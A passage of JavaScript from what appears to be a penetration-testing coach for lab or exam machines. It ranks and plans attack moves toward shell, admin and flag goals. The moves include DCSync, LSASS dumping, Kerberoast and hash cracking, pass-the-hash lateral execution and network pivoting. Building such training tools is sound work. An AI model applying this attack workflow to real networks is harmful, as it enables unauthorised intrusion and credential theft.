        var xsp = isSpecialize(x.a), ysp = isSpecialize(y.a);
        if (xsp !== ysp) return xsp ? 1 : -1;
      }
      if (y.stageRank !== x.stageRank) return y.stageRank - x.stageRank;
      if (y.score !== x.score) return y.score - x.score;
      if (y.a.priority !== x.a.priority) return y.a.priority - x.a.priority;
      // House toolkit: among moves equal on goal-progress AND hand-tuned priority, prefer the one that uses
      // NetExec (nxc) over an overlapping legacy tool, so "always prefer nxc" holds on genuine twins without
      // a per-move weight. Placed below priority (never reorders a move the pack ranked higher) and above
      // the locus tie-break (nxc is remote anyway, so they rarely conflict).
      var tx = moveToolkitRank(x.a), ty = moveToolkitRank(y.a);
      if (tx !== ty) return tx - ty;
      // Remote-first: among moves equal on goal-progress AND hand-tuned priority, prefer the lowest-friction
      // locus (R < F < I) so the coach never nudges you onto the box when an off-host move reaches the same
      // objective. Placed below priority so it only decides genuine twins - it never overrides a move the
      // pack deliberately ranked higher.
      var lx = locusRank(x.a.locus), ly = locusRank(y.a.locus);
      if (lx !== ly) return lx - ly;
      return x.a.id < y.a.id ? -1 : (x.a.id > y.a.id ? 1 : 0);
    });
    var ordered = scored.map(function (s) { return s.a; });

    // "Rule out AD first": on an AD box where the DC/domain is not yet confirmed and you have not landed
    // a foothold or credential, guarantee the top AD-orient move a top-3 slot, so the operator can always
    // get oriented (and rule AD out) before diving into service exploitation (a database login, a web
    // attack). A surgical post-sort promotion of ONE move to position 3; everything else keeps its order.
    // It self-disables the moment you are oriented (the orient move settles) or you are on the box.
    // (ranker-sim.js measures this.)
    var adOriented = haveObj['ad.dc_candidate'] && haveObj['ad.domain_known'];
    var committed = !!(haveObj['access.shell'] || haveObj['access.admin'] || haveObj['access.system'] || (!onlySpeculativeCrossDomainCred && haveObj['credential.available']));
    if (!committed) for (var _ck in haveObj) { if (/^foothold\./.test(_ck)) { committed = true; break; } }
    if (isAdTarget && !adOriented && !committed) {
      var isOrient = function (a) { return a.produces.some(function (k) { return (k === 'ad.dc_candidate' || k === 'ad.domain_known' || k === 'ad.base_dn' || k === 'ad.anonymous_bind') && !haveObj[k]; }); };
      if (!ordered.slice(0, 3).some(isOrient)) {
        for (var oi = 3; oi < ordered.length; oi++) { if (isOrient(ordered[oi])) { ordered.splice(2, 0, ordered.splice(oi, 1)[0]); break; } }
      }
    }
    return ordered;
  }

  // The coach's ranker. Goal-directed v2 by default; set OBOL.pack.ranker = 'v1' for the legacy
  // phase/priority planner (kept for comparison + fallback).
  function rankActions(facts, pack, opts) {
    return (OBOL.pack && OBOL.pack.ranker === 'v1') ? nextActions(facts, pack, opts) : nextActionsV2(facts, pack, opts);
  }

  // A "report-only" check: an info-severity finding whose produced facts enable nothing (no action
  // requires them) - an SPF/DMARC review, a security-header or TLS read, a CORS/HTTP-methods probe.
  // They belong in the writeup, not at the top of the coach, so the UI groups them out of the live
  // "ready" list instead of letting one headline a box you are actively working. Conservative: a move
  // is spared the moment any of its produced facts is consumed by another move (then it enables
  // progression and is a real step, not a dead-end report note). Cached per pack-array identity.
  var _consumedCache = typeof WeakMap === 'function' ? new WeakMap() : null;
  function consumedKinds(pack) {
    if (_consumedCache && _consumedCache.has(pack)) return _consumedCache.get(pack);
    var c = {};
    (pack || []).forEach(function (a) {
      (a.requires_all || []).concat(a.requires_any || []).forEach(function (k) { c[k] = 1; });
    });
    if (_consumedCache) _consumedCache.set(pack, c);
    return c;
  }
  function isReportOnly(action, pack) {
    if (!action || !action.report || action.report.severity !== 'info') return false;
    var prod = action.produces || [];
    if (!prod.length) return false;
    var consumed = pack ? consumedKinds(pack) : {};
    for (var i = 0; i < prod.length; i++) if (consumed[prod[i]]) return false;
    return true;
  }

  // --------------------------------------------------------------- full-route planner --
  // The lowest-cost sequence of moves from the current facts to any goal. Action cost encodes
  // reliability: a cash-in earned off specific evidence is cheap (1), an ordinary enumeration step
  // 1.5, a generic privilege shortcut 8, a speculative "try-if-vulnerable" move 12 - so the plan
  // prefers dependable routes and only resorts to speculation when nothing else reaches the goal.
  // A* with the step-distance heuristic (admissible: every step costs >= 1). Exact + instant for a
  // lab-sized graph. Returns { path:[actionId,...], cost, reachable }; reachable:false is an honest
  // "no route from here with the current move library", not a guess. OS is fixed per engagement, so
  // os-compatibility is judged once against the live facts.
  function v2ActionCost(a, haveObj) {
    var meta = v2GetActionMeta(a);
    var earned = v2Earned(a, haveObj);
    var base;
    if (!earned && v2Speculative(a, haveObj)) base = 12;
    else if (earned) base = 1;
    else base = meta.producesPriv ? 8 : 1.5;
    // Remote-first: a small surcharge for stepping onto the host (R +0, F +0.3, I +0.6) so the planner
    // prefers the Kali-side route when steps otherwise tie - never enough to reorder a genuinely cheaper
    // path. Running a command from Kali beats getting on the box: faster, and it leaves nothing behind.
    return base + meta.locusCost;
  }
  function planPath(facts, pack, opts) {
    opts = opts || {};
    var noFlags = !!(opts.noFlags || opts.flagsEnabled === false);
    var goals = opts.goals || (noFlags ? V2_GOALS_NO_FLAGS : V2_GOALS);
    var bundle = v2GetPackBundle(pack, noFlags);
    var activePack = bundle.activePack;
    var producers = bundle.producers;
    var relevant = Object.create(null), i, j0;
    for (i = 0; i < activePack.length; i++) {
      var act0 = activePack[i], ra0List = act0.requires_all, ry0List = act0.requires_any;
      for (j0 = 0; j0 < ra0List.length; j0++) relevant[ra0List[j0]] = 1;
      for (j0 = 0; j0 < ry0List.length; j0++) relevant[ry0List[j0]] = 1;
    }
    for (i = 0; i < goals.length; i++) relevant[goals[i]] = 1;

    var G = v2GetGraph(producers);
    var relKeys = Object.keys(relevant), R = relKeys.length, relBit = Object.create(null);
    var bitToFactId = v2AllocI32(((R + 31) >> 5) << 5);
    v2FillArr(bitToFactId, -1);
    for (i = 0; i < R; i++) {
      var rk = relKeys[i];
      relBit[rk] = i;
      var gfId = G.factId[rk];
      if (gfId !== undefined) bitToFactId[i] = gfId;
    }
    var W = (R + 31) >> 5;
    if (W < 1) W = 1;
    function bitsKey(b) {
      switch (W) {
        case 13: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4] + ',' + b[5] + ',' + b[6] + ',' + b[7] + ',' + b[8] + ',' + b[9] + ',' + b[10] + ',' + b[11] + ',' + b[12];
        case 12: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4] + ',' + b[5] + ',' + b[6] + ',' + b[7] + ',' + b[8] + ',' + b[9] + ',' + b[10] + ',' + b[11];
        case 14: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4] + ',' + b[5] + ',' + b[6] + ',' + b[7] + ',' + b[8] + ',' + b[9] + ',' + b[10] + ',' + b[11] + ',' + b[12] + ',' + b[13];
        case 15: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4] + ',' + b[5] + ',' + b[6] + ',' + b[7] + ',' + b[8] + ',' + b[9] + ',' + b[10] + ',' + b[11] + ',' + b[12] + ',' + b[13] + ',' + b[14];
        case 16: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4] + ',' + b[5] + ',' + b[6] + ',' + b[7] + ',' + b[8] + ',' + b[9] + ',' + b[10] + ',' + b[11] + ',' + b[12] + ',' + b[13] + ',' + b[14] + ',' + b[15];
        case 11: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4] + ',' + b[5] + ',' + b[6] + ',' + b[7] + ',' + b[8] + ',' + b[9] + ',' + b[10];
        case 10: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4] + ',' + b[5] + ',' + b[6] + ',' + b[7] + ',' + b[8] + ',' + b[9];
        case 9: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4] + ',' + b[5] + ',' + b[6] + ',' + b[7] + ',' + b[8];
        case 8: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4] + ',' + b[5] + ',' + b[6] + ',' + b[7];
        case 7: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4] + ',' + b[5] + ',' + b[6];
        case 6: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4] + ',' + b[5];
        case 5: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3] + ',' + b[4];
        case 4: return b[0] + ',' + b[1] + ',' + b[2] + ',' + b[3];
        case 3: return b[0] + ',' + b[1] + ',' + b[2];
        case 2: return b[0] + ',' + b[1];
        case 1: return String(b[0]);
        default:
          var s = String(b[0]);
          for (var w = 1; w < W; w++) s += ',' + b[w];
          return s;
      }
    }

    // OS is fixed per box but may only be learned partway in: honor a known family from the live facts,
    // else infer it from footholds as the plan accrues them, so a Linux foothold rules out Windows moves.
    var startFam = hostOsFamily(facts);
    function famCodeOf(st) {
      if (startFam === 'windows') return 1;
      if (startFam === 'linux') return 2;
      if (startFam) return 3;
      if (st['foothold.windows'] || st['winrm.authenticated'] || st['rdp.authenticated']) return 1;
      if (st['foothold.linux']) return 2;
      return 0;
    }

    var activeLen = activePack.length;
    var allowWin = v2AllocU8(activeLen), allowLin = v2AllocU8(activeLen), allowOther = v2AllocU8(activeLen);
    var ra0 = v2AllocI32(activeLen), ra1 = v2AllocI32(activeLen), raMore = v2AllocU8(activeLen);
    var reqAllBits = new Array(activeLen), hasReqAny = v2AllocU8(activeLen), reqAnyBits = new Array(activeLen);
    var prBitOff = v2AllocI32(activeLen + 1), prBitTemp = [], totalRelProd = 0;
    for (i = 0; i < activeLen; i++) {
      var act = activePack[i], al = act.os || [], j;
      if (!al.length) {
        allowWin[i] = 1; allowLin[i] = 1; allowOther[i] = 1;
      } else {
        for (j = 0; j < al.length; j++) {
          var nf = normalizeOsName(al[j]);
          if (nf === 'windows') allowWin[i] = 1;
          else if (nf === 'linux') allowLin[i] = 1;
          else if (nf === startFam && startFam) allowOther[i] = 1;
        }
      }
      var ra = act.requires_all;
      ra0[i] = ra.length >= 1 ? relBit[ra[0]] : -1;
      ra1[i] = ra.length >= 2 ? relBit[ra[1]] : -1;
      if (ra.length > 2) {
        raMore[i] = 1;
        var rab = v2AllocI32(W);
        for (j = 0; j < ra.length; j++) { var rb1 = relBit[ra[j]]; rab[rb1 >> 5] |= (1 << (rb1 & 31)); }
        reqAllBits[i] = rab;
      } else {
        reqAllBits[i] = _V2_EMPTY_I32;
      }
      var ry = act.requires_any;
      if (ry.length) {
        hasReqAny[i] = 1;
        var ryb = v2AllocI32(W);
        for (j = 0; j < ry.length; j++) { var rb2 = relBit[ry[j]]; ryb[rb2 >> 5] |= (1 << (rb2 & 31)); }
        reqAnyBits[i] = ryb;
      } else {
        reqAnyBits[i] = _V2_EMPTY_I32;
      }
      var pr = act.produces, prList = [];
      for (j = 0; j < pr.length; j++) {
        var rb3 = relBit[pr[j]];
        if (rb3 !== undefined && prList.indexOf(rb3) < 0) prList.push(rb3);
      }
      prBitTemp.push(prList);
      totalRelProd += prList.length;
    }
    var prBitFlat = v2AllocI32(totalRelProd), prCur = 0;
    for (i = 0; i < activeLen; i++) {
      prBitOff[i] = prCur;
      var pl2 = prBitTemp[i];
      for (var pli2 = 0; pli2 < pl2.length; pli2++) prBitFlat[prCur++] = pl2[pli2];
    }
    prBitOff[activeLen] = prCur;

    var goalBits = v2AllocI32(W), goalFactIds = v2AllocI32(goals.length);
    var goalReach = v2AllocU8(G.F), bfsQ = v2AllocI32(G.F), qHead = 0, qTail = 0;
    for (i = 0; i < goals.length; i++) {
      var gb = relBit[goals[i]];
      goalBits[gb >> 5] |= (1 << (gb & 31));
      var gfid = G.factId[goals[i]];
      goalFactIds[i] = gfid !== undefined ? gfid : -1;
      if (gfid !== undefined && !goalReach[gfid]) {
        goalReach[gfid] = 1;
        bfsQ[qTail++] = gfid;
      }
    }
    var gProdOff = G.prodOff, gProdFlat = G.prodFlat;
    var gReqAllOff = G.reqAllOff, gReqAllFlat = G.reqAllFlat;
    var gReqAnyOff = G.reqAnyOff, gReqAnyFlat = G.reqAnyFlat;
    while (qHead < qTail) {
      var cf = bfsQ[qHead++];
      var ps0 = gProdOff[cf], pe0 = gProdOff[cf + 1];
      for (var pi0 = ps0; pi0 < pe0; pi0++) {
        var mu = gProdFlat[pi0], ri0, nf0;
        var ras = gReqAllOff[mu], rae = gReqAllOff[mu + 1];
        for (ri0 = ras; ri0 < rae; ri0++) {
          nf0 = gReqAllFlat[ri0];
          if (!goalReach[nf0]) { goalReach[nf0] = 1; bfsQ[qTail++] = nf0; }
        }
        var rys = gReqAnyOff[mu], rye = gReqAnyOff[mu + 1];
        for (ri0 = rys; ri0 < rye; ri0++) {
          nf0 = gReqAnyFlat[ri0];
          if (!goalReach[nf0]) { goalReach[nf0] = 1; bfsQ[qTail++] = nf0; }
        }
      }
    }
    var bitCanReachGoal = v2AllocU8(R), isGoalBit = v2AllocU8(R);
    for (i = 0; i < R; i++) {
      var bfid = bitToFactId[i];
      if (bfid !== -1 && goalReach[bfid]) bitCanReachGoal[i] = 1;
    }
    for (i = 0; i < goals.length; i++) {
      var gbi = relBit[goals[i]];
      bitCanReachGoal[gbi] = 1;
      isGoalBit[gbi] = 1;
    }

    var heap = [], seqCounter = 0;
    function heapLess(x, y) {
      return x.f < y.f || (x.f === y.f && x.seq < y.seq);
    }
    function heapInsertRaw(node) {
      var idx = heap.length;
      heap.push(node);
      while (idx > 0) {
        var p = (idx - 1) >> 1;
        if (!heapLess(heap[idx], heap[p])) break;
        var tmp = heap[p]; heap[p] = heap[idx]; heap[idx] = tmp;
        idx = p;
      }
    }
    function heapPush(node) {
      node.seq = seqCounter++;
      heapInsertRaw(node);
    }
    function heapPop() {
      var top = heap[0], last = heap.pop();
      if (heap.length > 0) {
        heap[0] = last;
        var idx = 0, len = heap.length;
        while (true) {
          var l = (idx << 1) + 1, r = l + 1, sm = idx;
          if (l < len && heapLess(heap[l], heap[sm])) sm = l;
          if (r < len && heapLess(heap[r], heap[sm])) sm = r;
          if (sm === idx) break;
          var tmp = heap[idx]; heap[idx] = heap[sm]; heap[sm] = tmp;
          idx = sm;
        }
      }
      return top;
    }

    var start = {}, startBits = v2AllocI32(W), have = facts.kinds(), k;
    for (k in have) {
      start[k] = 1;
      var sb = relBit[k];
      if (sb !== undefined) startBits[sb >> 5] |= (1 << (sb & 31));
    }
    var startSig = bitsKey(startBits);
    var gScore = Object.create(null), came = Object.create(null), hCache = Object.create(null);
    var h0 = v2GoalDistanceBits(G, startBits, W, bitToFactId, goalBits, goalFactIds);
    hCache[startSig] = h0;
    gScore[startSig] = 0;
    heapPush({ st: start, pSt: null, addProd: null, bits: startBits, sig: startSig, gc: 0, h: h0, hDone: true, f: h0 });

    var exp = 0, MAXEXP = 60000, tmpBits = v2AllocI32(W);
    while (heap.length) {
      var cur = heapPop();
      if (!cur.hDone) {
        var realH = hCache[cur.sig];
        if (realH === undefined) {
          realH = v2GoalDistanceBits(G, cur.bits, W, bitToFactId, goalBits, goalFactIds);
          hCache[cur.sig] = realH;
        }
        cur.h = realH;
        cur.f = cur.gc + realH;
        cur.hDone = true;
        heapInsertRaw(cur);
        continue;
      }
      var cs = cur.sig, curBits = cur.bits, curH = cur.h;
      if (++exp > MAXEXP) break;
      var hitGoal = false, w;
      for (w = 0; w < W; w++) { if ((curBits[w] & goalBits[w]) !== 0) { hitGoal = true; break; } }
      if (hitGoal) {
        var pathIds = [], s = cs;
        while (came[s]) { pathIds.unshift(came[s].move); s = came[s].prev; }
        return { path: pathIds, cost: cur.gc, reachable: true };
      }
      if (cur.gc > gScore[cs]) continue;
      var curSt = cur.st;
      if (!curSt) {
        curSt = {};
        var pst = cur.pSt, kk;
        for (kk in pst) curSt[kk] = 1;
        var cap = cur.addProd;
        for (var cpi = 0; cpi < cap.length; cpi++) curSt[cap[cpi]] = 1;
        cur.st = curSt;
      }
      var famCode = famCodeOf(curSt);
      for (var ai = 0; ai < activeLen; ai++) {
        if (famCode === 1) { if (!allowWin[ai]) continue; }
        else if (famCode === 2) { if (!allowLin[ai]) continue; }
        else if (famCode === 3) { if (!allowOther[ai]) continue; }

        var b0 = ra0[ai];
        if (b0 !== -1) {
          if ((curBits[b0 >> 5] & (1 << (b0 & 31))) === 0) continue;
          var b1 = ra1[ai];
          if (b1 !== -1) {
            if ((curBits[b1 >> 5] & (1 << (b1 & 31))) === 0) continue;
            if (raMore[ai]) {
              var rab2 = reqAllBits[ai], okAll = true;
              for (w = 0; w < W; w++) {
                if (((curBits[w] & rab2[w]) ^ rab2[w]) !== 0) { okAll = false; break; }
              }
              if (!okAll) continue;
            }
          }
        }
        if (hasReqAny[ai]) {
          var ryb2 = reqAnyBits[ai], okAny = false;
          for (w = 0; w < W; w++) {
            if ((curBits[w] & ryb2[w]) !== 0) { okAny = true; break; }
          }
          if (!okAny) continue;
        }
        var ps = prBitOff[ai], pe = prBitOff[ai + 1];
        if (ps === pe) continue;
        var addsRelevant = false, touchesGoalCone = false, hitsGoalNow = false, pbi;
        for (pbi = ps; pbi < pe; pbi++) {
          var pb = prBitFlat[pbi];
          if ((curBits[pb >> 5] & (1 << (pb & 31))) === 0) {
            addsRelevant = true;
            if (bitCanReachGoal[pb]) touchesGoalCone = true;
            if (isGoalBit[pb]) hitsGoalNow = true;
          }
        }
        if (!addsRelevant) continue;
        for (w = 0; w < W; w++) tmpBits[w] = curBits[w];
        for (pbi = ps; pbi < pe; pbi++) {
          var pb2 = prBitFlat[pbi];
          tmpBits[pb2 >> 5] |= (1 << (pb2 & 31));
        }

        var a = activePack[ai];
        var nsig = bitsKey(tmpBits), ng = cur.gc + v2ActionCost(a, curSt);
        var prevG = gScore[nsig];
        if (prevG === undefined || ng < prevG) {
          gScore[nsig] = ng;
          came[nsig] = { prev: cs, move: a.id };
          var nbits = v2AllocI32(W);
          for (w = 0; w < W; w++) nbits[w] = tmpBits[w];
          if (hitsGoalNow) {
            hCache[nsig] = 0;
            heapPush({ st: null, pSt: curSt, addProd: a.produces, bits: nbits, sig: nsig, gc: ng, h: 0, hDone: true, f: ng });
          } else {
            var h = hCache[nsig];
            if (h === undefined && !touchesGoalCone) {
              h = curH;
              hCache[nsig] = curH;
            }
            if (h !== undefined) {
              heapPush({ st: null, pSt: curSt, addProd: a.produces, bits: nbits, sig: nsig, gc: ng, h: h, hDone: true, f: ng + h });
            } else {
              heapPush({ st: null, pSt: curSt, addProd: a.produces, bits: nbits, sig: nsig, gc: ng, h: 1, hDone: false, f: ng + 1 });
            }
          }
        }
      }
    }
    return { path: null, cost: Infinity, reachable: false };
  }

  // ------------------------------------------------------- Interactive Path Chooser --
  // Builds a structured multi-lane / multi-step menu model for high-choice move junctions:
  //   1. Windows & Linux Flag Capture (flag-hunt-windows, flag-hunt-root-windows, flag-hunt-linux, flag-hunt-root-linux)
  //   2. Interactive Shells & Remote Execution (win-interactive-shell, lateral-exec, own-domain-pth, fix-no-tty)
  //   3. Post-Admin Credential Dumping (dcsync, dump-secrets, lsass-dump-onbox)
  //   4. Offline Hash Cracking (crack-tgs, crack-kerberoast, crack-asrep, crack-asrep-offline, crack-ntlm, crack-netntlmv2)
  //   5. File / Tool Staging & Enumeration (windows-enum, linux-enum, bloodhound-collect, ad-path-manual)
  //   6. Pivoting & Tunneling (ligolo-tunnel-pivot, pivot-ligolo, pivot-chisel-socks, pivot-ssh-portforward)
  var PATH_CHOOSER_IDS = {
    'flag-hunt-windows': 'flag-capture',
    'flag-hunt-root-windows': 'flag-capture',
    'flag-hunt-linux': 'flag-capture',
    'flag-hunt-root-linux': 'flag-capture',
    'win-interactive-shell': 'interactive-shell',
    'lateral-exec': 'interactive-shell',
    'own-domain-pth': 'interactive-shell',
    'fix-no-tty': 'interactive-shell',
    'dcsync': 'cred-dump',
    'dump-secrets': 'cred-dump',
    'lsass-dump-onbox': 'cred-dump',
    'crack-tgs': 'hash-cracking',
    'crack-kerberoast': 'hash-cracking',
    'crack-asrep': 'hash-cracking',
    'crack-asrep-offline': 'hash-cracking',
    'crack-ntlm': 'hash-cracking',
    'crack-netntlmv2': 'hash-cracking',
    'windows-enum': 'enum-staging',
    'linux-enum': 'enum-staging',
    'bloodhound-collect': 'enum-staging',
    'ad-path-manual': 'enum-staging',
    'smb-share-inventory': 'enum-staging',
    'gpp-passwords': 'enum-staging',
    'ligolo-tunnel-pivot': 'pivoting',
    'pivot-ligolo': 'pivoting',
    'pivot-chisel-socks': 'pivoting',
    'pivot-ssh-portforward': 'pivoting',
  };

  var ACTION_TO_DECK = {
    'flag-hunt-windows': { tabId: 'flags', laneId: 'user-smb-share' },
    'flag-hunt-root-windows': { tabId: 'flags', laneId: 'both-flags-onhost' },
    'flag-hunt-linux': { tabId: 'flags', laneId: 'linux-user-ssh' },
    'flag-hunt-root-linux': { tabId: 'flags', laneId: 'linux-root-proof' },
    'win-interactive-shell': { tabId: 'shells', laneId: 'shell-winrm' },
    'lateral-exec': { tabId: 'shells', laneId: 'shell-admin-exec' },
    'own-domain-pth': { tabId: 'shells', laneId: 'shell-admin-exec' },
    'fix-no-tty': { tabId: 'shells', laneId: 'shell-ssh' },
    'dcsync': { tabId: 'persistence', laneId: 'persist-hash-dump' },
    'dump-secrets': { tabId: 'persistence', laneId: 'persist-hash-dump' },
    'lsass-dump-onbox': { tabId: 'persistence', laneId: 'persist-hash-dump' },
    'crack-tgs': { tabId: 'credops', laneId: 'credops-kerberoast' },
    'crack-kerberoast': { tabId: 'credops', laneId: 'credops-kerberoast' },
    'crack-asrep': { tabId: 'credops', laneId: 'credops-asreproast' },
    'crack-asrep-offline': { tabId: 'credops', laneId: 'credops-asreproast' },
    'crack-ntlm': { tabId: 'credops', laneId: 'credops-validate' },
    'crack-netntlmv2': { tabId: 'credops', laneId: 'credops-validate' },
    'windows-enum': { tabId: 'shares', laneId: 'shares-stage-tools' },
    'linux-enum': { tabId: 'shares', laneId: 'shares-stage-tools' },
    'bloodhound-collect': { tabId: 'credops', laneId: 'credops-acl-bh' },
    'ad-path-manual': { tabId: 'credops', laneId: 'credops-acl-bh' },
    'smb-share-inventory': { tabId: 'shares', laneId: 'shares-custom-gpp' },
    'gpp-passwords': { tabId: 'shares', laneId: 'shares-custom-gpp' },
    'ligolo-tunnel-pivot': { tabId: 'shares', laneId: 'shares-stage-tools' },
    'pivot-ligolo': { tabId: 'shares', laneId: 'shares-stage-tools' },
    'pivot-chisel-socks': { tabId: 'shares', laneId: 'shares-stage-tools' },
    'pivot-ssh-portforward': { tabId: 'shells', laneId: 'shell-ssh' }
  };

  function hasPathChooser(action) {
    var id = action && (typeof action === 'string' ? action : action.id);
    return !!(id && PATH_CHOOSER_IDS[id]);
  }

  function buildPathChooser(action, facts, params, filled, eng) {
    if (!action || !action.id || !PATH_CHOOSER_IDS[action.id]) return null;
    eng = eng || ((root.OBOL && root.OBOL.store && typeof root.OBOL.store.active === 'function') ? root.OBOL.store.active() : null) || {};
    params = params || (action.resolvedContext && action.resolvedContext.params) || eng.params || {};
    facts = facts || (action.resolvedContext && action.resolvedContext.facts) || ((root.OBOL && root.OBOL.store && typeof root.OBOL.store.factSet === 'function') ? root.OBOL.store.factSet() : null);
    if (!filled && root.OBOL && root.OBOL.command && typeof root.OBOL.command.fillAll === 'function') {
      var ws = (root.OBOL.workspace && typeof root.OBOL.workspace.tokens === 'function') ? root.OBOL.workspace.tokens(eng) : undefined;
      filled = root.OBOL.command.fillAll(action, facts, { params: params, profile: eng.profile, workspace: ws });
    }
    filled = filled || [];
    var ctx = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.buildContext === 'function')
      ? root.OBOL.command.buildContext(facts, { action: action, params: params, profile: eng.profile })
      : (params || {});
    var activities = Array.isArray(eng.activities) ? eng.activities : [];
    var target = action.contextTarget || params.target || ctx.target || '';
    var epoch = facts ? accessEpoch(facts) : 'anon';

    var openPorts = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.openPorts === 'function' && facts)
      ? root.OBOL.command.openPorts(facts) : [];
    var hasPortScan = openPorts.length > 0;
    var allFacts = (root.OBOL && root.OBOL.store && typeof root.OBOL.store.factSet === 'function')
      ? root.OBOL.store.factSet()
      : facts;
    function hasFact(k) { return !!(facts && typeof facts.has === 'function' && facts.has(k)); }
    function factVals(k) { return (facts && typeof facts.values === 'function') ? (facts.values(k) || []) : []; }
    function hasAnyFact(k) { return hasFact(k) || !!(allFacts && typeof allFacts.has === 'function' && allFacts.has(k)); }
    function allFactVals(k) {
      var a = (allFacts && typeof allFacts.values === 'function') ? (allFacts.values(k) || []) : [];
      return a.length ? a : factVals(k);
    }
    function isPortOpen(p) {
      if (hasFact('port:' + p)) return true;
      if (openPorts.indexOf(p) >= 0) return true;
      return !hasPortScan;
    }

    var winrmOpen = hasFact('port:5985') || hasFact('port:5986') || openPorts.indexOf(5985) >= 0 || openPorts.indexOf(5986) >= 0 || hasFact('service.winrm') || hasFact('winrm.reachable') || hasFact('host.winrm_enabled') || hasFact('winrm.authenticated');
    var rdpOpen = hasFact('port:3389') || openPorts.indexOf(3389) >= 0 || hasFact('service.rdp') || hasFact('rdp.reachable') || hasFact('host.rdp_enabled') || hasFact('rdp.authenticated');
    var smbOpen = isPortOpen(445) || isPortOpen(139) || hasFact('service.smb') || hasFact('smb.reachable') || hasFact('smb.authenticated') || hasFact('smb.shares');
    var sshOpen = isPortOpen(22) || hasFact('service.ssh') || hasFact('ssh.reachable') || hasFact('ssh.authenticated');
    var hasAdmin = hasFact('access.admin') || hasFact('access.system') || hasFact('access.root') || hasFact('access.admin_shell')
      || !!(ctx.dahash || params.dahash);
    var hasWinShell = hasFact('foothold.windows') || hasFact('access.desktop') || hasFact('access.admin_shell') || hasFact('access.shell');
    var hasLinShell = hasFact('foothold.linux') || hasFact('access.shell') || hasFact('access.root');
    var useNtHash = !!(ctx.nthash && !ctx.password);
    var useDaHash = !!(ctx.dahash && (!ctx.password || /^administrator$/i.test(ctx.user || '')));

    var localFlagCaptured = hasFact('objective.local_flag');
    var rootFlagCaptured = hasFact('objective.root_flag');
    var localFlagOnHost = factVals('objective.local_flag').some(function (v) { return v && v.on_host === true; });
    var rootFlagOnHost = factVals('objective.root_flag').some(function (v) { return v && v.on_host === true; });
    var localFlagRemoteOnly = localFlagCaptured && !localFlagOnHost;
    var needsBothFlagsOnHost = !localFlagCaptured || localFlagRemoteOnly;

    var localPathKnown = hasFact('objective.flag_located_local')
      || factVals('objective.flag_located').some(function (v) { return v && v.slot === 'local'; })
      || !!(ctx.flag_path_local && ctx.flag_path_local.indexOf('{{') < 0);
    var rootPathKnown = hasFact('objective.flag_located_root')
      || factVals('objective.flag_located').some(function (v) { return v && v.slot === 'root'; })
      || !!(ctx.flag_path_root && ctx.flag_path_root.indexOf('{{') < 0);

    var id = action.id;
    var category = PATH_CHOOSER_IDS[id];
    var launcherTitle = 'Choose Your Path';
    var launcherSub = 'Pick your preferred method below — run steps one by one or run the whole sequence and paste once.';
    var callout = null;
    var rawGroups = [];

    if (id === 'flag-hunt-windows') {
      launcherSub = 'Grab user.txt remotely from Kali, or open an interactive session on the host for an exam proof screenshot.';
      var nonAdminClosedShells = !hasAdmin && !winrmOpen && !rdpOpen && !hasWinShell;
      if (nonAdminClosedShells) {
        callout = {
          kind: 'info',
          title: 'Standard User · Interactive Shell Ports (5985 / 3389) Currently Closed',
          body: 'Non-admin domain users cannot spawn SMB/WMI services or enable RDP/WinRM remotely. Grab user.txt via "SMB Share Spider + Download" now — once you escalate to Administrator, Obol will automatically highlight "Capture Both User + Root Flags On-Host" so you get both exam proof screenshots in one shot.'
        };
      }
      rawGroups = [
        {
          id: 'remote',
          icon: 'zap',
          label: 'Remote Flag Grab (From Kali)',
          lanes: [
            {
              id: 'smb-share',
              label: 'SMB Share Spider + Download',
              portLabel: 'Port 445',
              doneWhen: function () { return localFlagCaptured; },
              lockedWhen: function () { return !smbOpen; },
              lockBadge: 'Port 445 Closed',
              steps: [
                {
                  title: 'Locate User Flag on SMB Share',
                  sub: 'Spiders the Users share from Kali to discover the exact path to user.txt.',
                  cmdIndex: 15,
                  doneWhen: function () { return localPathKnown; }
                },
                {
                  title: 'Download & Print User Flag via smbclient',
                  sub: 'Downloads and prints user.txt from the discovered share path.',
                  cmdIndex: 16,
                  doneWhen: function () { return localFlagCaptured; }
                }
              ]
            },
            {
              id: 'winrm-remote',
              label: 'WinRM Remote Locate + Read',
              portLabel: 'Port 5985',
              doneWhen: function () { return localFlagCaptured; },
              lockedWhen: function () { return !winrmOpen; },
              lockBadge: 'Port 5985 Closed',
              lockReason: 'Port 5985 (WinRM) is closed on this host. Use SMB Share Spider + Download, or enable WinRM once you have Admin.',
              steps: [
                {
                  title: 'Locate User Flag Remotely over WinRM',
                  sub: 'Searches C:\\Users for user.txt over WinRM without opening an interactive shell.',
                  cmdIndex: 12,
                  doneWhen: function () { return localPathKnown; }
                },
                {
                  title: 'Read User Flag Remotely over WinRM',
                  sub: 'Reads the discovered user.txt path directly over WinRM.',
                  cmdIndex: useNtHash ? 14 : 13,
                  doneWhen: function () { return localFlagCaptured; }
                }
              ]
            },
            {
              id: 'smb-exec-remote',
              label: 'SMB Remote Exec Sweep',
              portLabel: 'Port 445 · Admin',
              doneWhen: function () { return localFlagCaptured; },
              lockedWhen: function () { return !hasAdmin; },
              lockBadge: 'Needs Admin',
              lockReason: 'nxc smb -x requires Local Administrator rights. Standard users should use SMB Share Spider + Download instead.',
              steps: [
                {
                  title: 'Sweep All Desktops via SMB Command Execution',
                  sub: 'Scans every user Desktop for user.txt / local.txt in under 1 second.',
                  cmdIndex: useDaHash ? 18 : 17,
                  doneWhen: function () { return localPathKnown; }
                },
                {
                  title: 'Download Located Flag via SMB',
                  sub: 'Retrieves and prints the located user flag.',
                  cmdIndex: 16,
